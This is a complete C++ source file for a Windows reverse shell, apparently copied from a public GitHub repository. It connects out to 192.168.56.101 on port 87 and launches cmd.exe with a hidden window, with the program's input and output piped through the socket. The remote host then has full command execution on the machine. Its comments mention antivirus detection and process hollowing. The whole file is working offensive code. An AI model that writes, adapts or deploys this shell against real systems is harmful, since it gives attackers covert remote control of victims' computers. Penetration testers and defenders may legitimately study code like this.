#define _WIN32_WINNT 0x0600
//https://github.com/Krptyk/Cpp-Reverse-Shell/blob/main/CppReverseShell.cpp
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")
using namespace std;

SOCKET ConnectToServer(const string& ip, int port) {
    WSADATA wsData;
    //WSA startup, intializes winsock (windows networking API)
    if (WSAStartup(MAKEWORD(2,2), &wsData) != 0) {
       cerr << "WSAStartup failed\n";
        return INVALID_SOCKET; // err logic, return if any trouble with invalid socket.
    }
    //else create a TCP socket for communication to the provided ip address via  provided port.
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (s == INVALID_SOCKET) {
       cerr << "Socket creation failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    //connect to remote IP/Port
    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());



    if (WSAConnect(s, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr),
                   nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
        cerr << "Connection failed\n";
        closesocket(s);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return s;
}

//launches cmd.exe (this will likely trigger defender, no matter if injected into memory via process hollowing or manually invoked by another process.)
void SpawnShell(SOCKET s) {
    STARTUPINFOW si = {};  // Use the wide version
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = reinterpret_cast<HANDLE>(s);
    si.hStdOutput = reinterpret_cast<HANDLE>(s);
    si.hStdError  = reinterpret_cast<HANDLE>(s);
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    std::wstring cmd = L"cmd.exe";

    if (!CreateProcessW(
            nullptr,
            const_cast<LPWSTR>(cmd.c_str()), // wide string
            nullptr,
            nullptr,
            TRUE,   // inherit handles
            0,
            nullptr,
            nullptr,
            &si,
            &pi)) {
       cerr << "CreateProcess failed: " << GetLastError() << endl;
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


int main() {
    SOCKET s = ConnectToServer("192.168.56.101", 87);
    if (s == INVALID_SOCKET) return -1;
    SpawnShell(s);
    closesocket(s);
    WSACleanup();
    return 0;
}
